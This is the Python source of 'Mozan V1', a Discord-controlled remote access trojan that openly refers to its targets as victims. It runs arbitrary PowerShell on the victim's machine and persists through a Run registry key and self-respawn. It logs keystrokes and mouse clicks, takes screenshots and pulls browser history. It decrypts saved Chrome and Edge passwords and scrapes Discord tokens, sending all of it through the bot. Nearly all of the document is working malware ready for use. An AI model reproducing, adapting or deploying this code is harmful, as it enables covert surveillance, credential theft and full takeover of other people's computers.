"""
Mozan V1 🐀🤑
made by Werdane

Commands:
(Any text without '/' at the begining would be treated as powershell commands)

> /download - lets you download files from victim's device 💻 ➡ 📁
> /upload - lets you upload files to victim's device 📁 ➡ 💻
> /screenshot - lets you screenshot the victim's pc 📸 💻
> /whatismyip - gets victim's ip address 😎 💻
> /getdiscord - gets the victim's discord token 🤣
> /showhistory - gets the victim's history 😳
> /startlog - starts keystroke and click logger ⌨ 🖱
> /retrievelog - retrieves the log 📜
> /clearlog - clears the log 📜 🚮
> /stoplog - stops keylogging ⌨ 🤚
> /getpasswords - gets passwords from Edge and Chrome browser 🔐
"""
import discord
from discord.ext import commands
import subprocess
import os
import socket
import pyautogui
import re, requests
import zipfile
import winreg as reg
import browser_history as bh
from datetime import datetime
from re import findall
from pynput import mouse, keyboard
from Crypto.Cipher import AES
import sqlite3
import win32crypt
import json
import base64
import shutil
import time
import sys
startup_folder = rf"{os.environ['USERPROFILE']}\AppData\Local\Temp"
BOT_TOKEN = "BOT_TOKEN"

if getattr(sys, 'frozen', False): 
    current_file_path = sys.executable 
else: 
    current_file_path =os.path.abspath(__file__)

MAX_FILE_SIZE = 10 * 1024 * 1024
DISCORD_MAX_MESSAGE_LENGTH = 2000
 # you can change this to make it more difficult for user to find the file :)
destination_path = os.path.join(startup_folder, os.path.basename(sys.executable))
log_file_path = startup_folder + "\\activity_log.txt"
try:
    try:
        os.system(f"move \"{current_file_path}\" \"{startup_folder}\"")
        os.chdir(startup_folder)
    except Exception as e:
        print(f"Error: {e}")


    def add_to_startup(file_path):
        try:
            import winreg as reg
            key = reg.HKEY_CURRENT_USER
            key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
            key2 = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

            reg.SetValueEx(key2, 'rr5', 0, reg.REG_SZ, file_path)
            reg.CloseKey(key2)
            print("Added to Startup")
        except Exception as e:
            print(f"Error: {e}")

    add_to_startup(destination_path)



    description = '''A simple discord bot that uses channels as a way to interact with clients.'''

    intents = discord.Intents.default()
    intents.members = True
    intents.message_content = True

    bot = commands.Bot(command_prefix='/', description=description, intents=intents)
    computer_directories = {}
    hostname_to_channel = {}

    ######################################################## START OF PASSWORD STEALING FUNCTIONS ########################################################
    ######################################################## START OF PASSWORD STEALING FUNCTIONS ########################################################
    ######################################################## START OF PASSWORD STEALING FUNCTIONS ########################################################

    # This part is a modified code of code I got from https://github.com/mpdg837/ZlodzejHasel
    def get_master_key():
        try:
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
                encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key", None)
                if not encrypted_key:
                    print("No encrypted key found")
                    return None
        except Exception as e:
            print(f"Error reading master key file: {e}")
            return None
        try:
            master_key = base64.b64decode(encrypted_key)
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            print(f"Error decrypting master key: {e}")
            return None

    def get_master_key_chr():
        try:
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
                encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key", None)
                if not encrypted_key:
                    print("No encrypted key found")
                    return None
            master_key = base64.b64decode(encrypted_key)
            master_key = master_key[5:]  # removing DPAPI
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            print(f"Error getting Chrome master key: {e}")
            return None

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
            return decrypted_pass
        except Exception as e:
            print(f"Error decrypting password: {e}")
            return None

    def get_password_edge():
        try:
            master_key = get_master_key()
            if not master_key:
                return []
            
            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
            try:
                shutil.copy2(login_db, "Loginvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
            except Exception as e:
                print(f"Error copying database: {e}")
                return []

            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            login_data = []

            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    if username and decrypted_password:
                        login_data.append({
                            'url': url,
                            'username': username,
                            'password': decrypted_password
                        })
            except Exception as e:
                print(f"Error fetching logins: {e}")
            finally:
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")

            return login_data
        except Exception as e:
            print(f"Error in get_password_edge: {e}")
            return []

    def get_passwords():
        try:
            main_loc = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data' + os.sep
            possible_locations = ["Default", "Guest Profile"]
            for folder in os.listdir(main_loc):
                if "Profile " in folder:
                    possible_locations.append(folder)

            master_key = get_master_key_chr()
            if master_key is None:
                return []

            passwords = []

            for loc in possible_locations:
                try:
                    path_db = main_loc + loc + os.sep + 'Login Data'
                    db_loc = os.getcwd() + os.sep + "Loginvault.db"

                    shutil.copy2(path_db, db_loc)  # making a temp copy since Login Data DB is locked while Chrome is running
                    conn = sqlite3.connect(db_loc)
                    cursor = conn.cursor()
                    try:
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for r in cursor.fetchall():
                            url = r[0]
                            username = r[1]
                            encrypted_password = r[2]
                            decrypted_password = decrypt_password(encrypted_password, master_key)
                            if len(username) > 0 and decrypted_password != "Chrome < 80":
                                passwords.append({
                                    'url': url,
                                    'username': username,
                                    'password': decrypted_password
                                })
                    except Exception as e:
                        print(f"Error fetching logins from {loc}: {e}")
                    cursor.close()
                    conn.close()
                    try:
                        os.remove(db_loc)
                        time.sleep(0.2)
                    except Exception as e:
                        print(f"Error removing temporary database: {e}")
                except Exception as e:
                    print(f"Error accessing location {loc}: {e}")

            return passwords
        except Exception as e:
            print(f"Error in get_passwords: {e}")
            return []

    ######################################################## END OF PASSWORD STEALING FUNCTIONS ########################################################
    ######################################################## END OF PASSWORD STEALING FUNCTIONS ########################################################
    ######################################################## END OF PASSWORD STEALING FUNCTIONS ########################################################



    @bot.event
    async def on_ready():
        global destination_path
        print(f'Logged in as {bot.user} (ID: {bot.user.id})')
        print('------')

        hostname = socket.gethostname().lower()

        if hostname not in computer_directories:
            computer_directories[hostname] = os.getcwd()
            guild = discord.utils.get(bot.guilds)

            existing_channel = discord.utils.get(guild.channels, name=f'{hostname.lower()}')
            if existing_channel:
                hostname_to_channel[hostname] = existing_channel.id
                bot.loop.create_task(existing_channel.send(f'Welcome back! You can run commands for {hostname} here.'))
            else:
                new_channel = await guild.create_text_channel(f'{hostname}')
                hostname_to_channel[hostname] = new_channel.id
                bot.loop.create_task(new_channel.send(f'''\n
    Mozan 🐀🐀
    Made by werdane

    Current Directory: ```{destination_path}```
                                                    
    Commands:
    (Any text without '/' at the begining would be treated as powershell commands)

    > /download - lets you download files from victim's device 💻➡📁
    > /upload - lets you upload files to victim's device 📁➡💻
    > /screenshot - lets you screenshot the victim's pc 📸💻
    > /whatismyip - gets victim's ip address 😎💻
    > /getdiscord - gets the victim's discord token 🤣
    > /showhistory - gets the victim's history 😳
    > /startlog - starts keystroke and click logger ⌨🖱
    > /retrievelog - retrieves the log 📜
    > /clearlog - clears the log 📜🚮
    > /stoplog - stops keylogging ⌨🤚
    > /getpasswords - gets passwords from Edge and Chrome browser 🔐
                '''))

    @bot.event
    async def on_message(message):
        if message.author == bot.user:
            return

        hostname = socket.gethostname().lower()
        current_directory = computer_directories.get(hostname, os.getcwd())
        if message.channel.id != hostname_to_channel.get(hostname):
            await message.channel.send("You are not authorized to run commands in this channel.")
            return
        if not message.content.startswith('/'):
            cmd = message.content[0:].strip()
            if cmd.startswith('cd '):
                new_directory = cmd[3:].strip()
                try:
                    os.chdir(new_directory)
                    computer_directories[hostname] = os.getcwd()
                    await message.channel.send(f'Changed directory to {computer_directories[hostname]}')
                except Exception as e:
                    await message.channel.send(f'An error occurred: {str(e)}')
            else:
                try:
                    result = subprocess.check_output(["powershell.exe", "-Command", cmd], shell=True, stderr=subprocess.STDOUT, cwd=current_directory)
                    output = result.decode("utf-8")
                    if len(output) > DISCORD_MAX_MESSAGE_LENGTH:
                        with open('output.txt', 'w', encoding='utf-8') as f:
                            f.write(output)
                        await message.channel.send(file=discord.File('output.txt'))
                    else:
                        await message.channel.send(f'```\n{output}\n```')
                except subprocess.CalledProcessError as e:
                    output = e.output.decode("utf-8")
                    if len(output) > DISCORD_MAX_MESSAGE_LENGTH:
                        with open('error_output.txt', 'w', encoding='utf-8') as f:
                            f.write(output)
                        await message.channel.send(file=discord.File('error_output.txt'))
                    else:
                        await message.channel.send(f'```\n{output}\n```')
                except Exception as e:
                    error_message = str(e)
                    if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                        with open('exception_output.txt', 'w', encoding='utf-8') as f:
                            f.write(error_message)
                        await message.channel.send(file=discord.File('exception_output.txt'))
                    else:
                        await message.channel.send(f'An error occurred: {error_message}')
        else:
            await bot.process_commands(message)

    ######################

    def on_key_press(key):
        with open(log_file_path, 'a') as f:
            f.write(f"{datetime.now()} - Key pressed: {key}\n")

    def on_click(x, y, button, pressed):
        if pressed:
            with open(log_file_path, 'a') as f:
                f.write(f"{datetime.now()} - Mouse clicked at ({x}, {y}) with {button}\n")

    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    mouse_listener = mouse.Listener(on_click=on_click)

    @bot.command()
    async def getpasswords(ctx):
        hostname = socket.gethostname().lower()
        if ctx.channel.id != hostname_to_channel.get(hostname):
            await ctx.send("You are not authorized to run commands in this channel.")
            return

        try:
            passwords = get_passwords()
            passwords_edge = get_password_edge()
            with open('passwords.txt', 'w', encoding='utf-8') as f:
                for entry in passwords:
                    f.write(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n\n")
                for entry in passwords_edge:
                    f.write(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n\n")

            await ctx.send(file=discord.File('passwords.txt'))
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')


    @bot.command()
    async def startlog(ctx):
        hostname = socket.gethostname().lower()
        if ctx.channel.id != hostname_to_channel.get(hostname):
            await ctx.send("You are not authorized to run commands in this channel.")
            return

        try:
            with open(log_file_path, 'a') as f:
                f.write(f"Logging started at {datetime.now()}\n")
            keyboard_listener.start()
            mouse_listener.start()
            await ctx.send("Logging has started.")
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command()
    async def retrievelog(ctx):
        hostname = socket.gethostname().lower()
        if ctx.channel.id != hostname_to_channel.get(hostname):
            await ctx.send("You are not authorized to run commands in this channel.")
            return

        try:
            await ctx.send(file=discord.File(log_file_path))
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command()
    async def clearlog(ctx):
        hostname = socket.gethostname().lower()
        if ctx.channel.id != hostname_to_channel.get(hostname):
            await ctx.send("You are not authorized to run commands in this channel.")
            return

        try:
            open(log_file_path, 'w').close()
            await ctx.send("Log file has been cleared.")
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command()
    async def stoplog(ctx):
        hostname = socket.gethostname().lower()
        if ctx.channel.id != hostname_to_channel.get(hostname):
            await ctx.send("You are not authorized to run commands in this channel.")
            return

        try:
            keyboard_listener.stop()
            mouse_listener.stop()
            await ctx.send("Logging has stopped.")
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    ###

    @bot.command()
    async def showhistory(ctx):
        hostname = socket.gethostname().lower()
        if ctx.channel.id != hostname_to_channel.get(hostname):
            await ctx.send("You are not authorized to run commands in this channel.")
            return

        try:
            outputs = bh.get_history().histories
            with open('browser_history.txt', 'w', encoding='utf-8') as f:
                for timestamp, url, title in outputs:
                    f.write(f"Timestamp: {timestamp}\nURL: {url}\nTitle: {title}\n\n")

            await ctx.send(file=discord.File('browser_history.txt'))
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command()
    async def screenshot(ctx):
        hostname = socket.gethostname().lower()
        if ctx.channel.id != hostname_to_channel.get(hostname):
            await ctx.send("You are not authorized to run commands in this channel.")
            return

        try:
            screenshot = pyautogui.screenshot()
            screenshot_path = os.path.join(computer_directories[hostname], 'screenshot.png')
            screenshot.save(screenshot_path)
            await ctx.send(file=discord.File(screenshot_path))
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command()
    async def whatismyip(ctx):
        hostname = socket.gethostname().lower()
        if ctx.channel.id != hostname_to_channel.get(hostname):
            await ctx.send("You are not authorized to run commands in this channel.")
            return

        try:
            r = requests.get('https://ipinfo.io/json').text
            if len(r) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('ip_info.txt', 'w', encoding='utf-8') as f:
                    f.write(r)
                await ctx.send(file=discord.File('ip_info.txt'))
            else:
                await ctx.send(f'```{r}```')
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command()
    async def download(ctx, *, file_path):
        hostname = socket.gethostname().lower()
        if ctx.channel.id != hostname_to_channel.get(hostname):
            await ctx.send("You are not authorized to run commands in this channel.")
            return

        try:
            if os.path.exists(file_path):
                if os.path.isdir(file_path) or os.path.getsize(file_path) > MAX_FILE_SIZE:
                    compressed_file_path = f"{file_path}.zip"
                    with zipfile.ZipFile(compressed_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        if os.path.isdir(file_path):
                            for root, dirs, files in os.walk(file_path):
                                for file in files:
                                    zipf.write(os.path.join(root, file),
                                            os.path.relpath(os.path.join(root, file), file_path))
                        else:
                            zipf.write(file_path, os.path.basename(file_path))

                    file_path = compressed_file_path

                await ctx.send(file=discord.File(file_path))
            else:
                await ctx.send(f'The path `{file_path}` does not exist.')
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred while sending the file: {error_message}')




    @bot.command()
    async def upload(ctx, url: str = None):
        hostname = socket.gethostname().lower()
        if ctx.channel.id != hostname_to_channel.get(hostname):
            await ctx.send("You are not authorized to run commands in this channel.")
            return

        if url:
            try:
                filename = os.path.basename(url)
                file_path = os.path.join(computer_directories[hostname], filename)
                response = requests.get(url)
                response.raise_for_status() 
                with open(file_path, 'wb') as file:
                    file.write(response.content)
                await ctx.send(f'File {filename} downloaded and saved to {file_path}')
            except Exception as e:
                error_message = str(e)
                if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                    with open('exception_output.txt', 'w', encoding='utf-8') as f:
                        f.write(error_message)
                    await ctx.send(file=discord.File('exception_output.txt'))
                else:
                    await ctx.send(f'An error occurred while downloading the file: {error_message}')
        elif ctx.message.attachments:
            for attachment in ctx.message.attachments:
                try:
                    file_path = os.path.join(computer_directories[hostname], attachment.filename)
                    await attachment.save(file_path)
                    await ctx.send(f'File {attachment.filename} saved to {file_path}')
                except Exception as e:
                    error_message = str(e)
                    if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                        with open('exception_output.txt', 'w', encoding='utf-8') as f:
                            f.write(error_message)
                        await ctx.send(file=discord.File('exception_output.txt'))
                    else:
                        await ctx.send(f'An error occurred while saving the file: {error_message}')
        else:
            await ctx.send('No file attached or URL provided.')

    @bot.command()
    async def getdiscord(ctx):
        
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = [
            ROAMING + "\\Discord",
            ROAMING + "\\discordcanary",
            ROAMING + "\\discordptb",
            LOCAL + "\\Google\\Chrome\\User Data\\Default",
            ROAMING + "\\Opera Software\\Opera Stable",
            LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
            LOCAL + '\\Microsoft\\Edge\\User Data\\Default'
        ]
        tokens = []
        for path in PATHS:

            path += "\\Local Storage\\leveldb"
            
            if os.path.exists(path):
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                tokens.append(token)
            else:
                continue
        return await ctx.send(tokens)

    bot.run(BOT_TOKEN)
except SystemExit:
    subprocess.Popen([destination_path], creationflags=subprocess.CREATE_NO_WINDOW)
